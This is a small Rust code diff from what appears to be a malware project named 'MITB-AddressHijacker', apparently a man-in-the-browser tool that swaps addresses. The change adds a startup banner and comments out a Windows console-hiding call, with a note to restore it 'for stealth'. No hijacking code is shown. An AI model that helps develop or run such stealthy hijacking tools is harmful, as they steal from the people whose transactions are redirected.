@@ -22,8 +22,11 @@ impl Default for AppState {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
     
-    #[cfg(windows)]
-    hide_console();
+    println!("[*] MITB-AddressHijacker starting...");
+    
+    // Comment out for debugging - uncomment for stealth
+    // #[cfg(windows)]
+    // hide_console();
 
     let state = Arc::new(Mutex::new(AppState::default()));
 
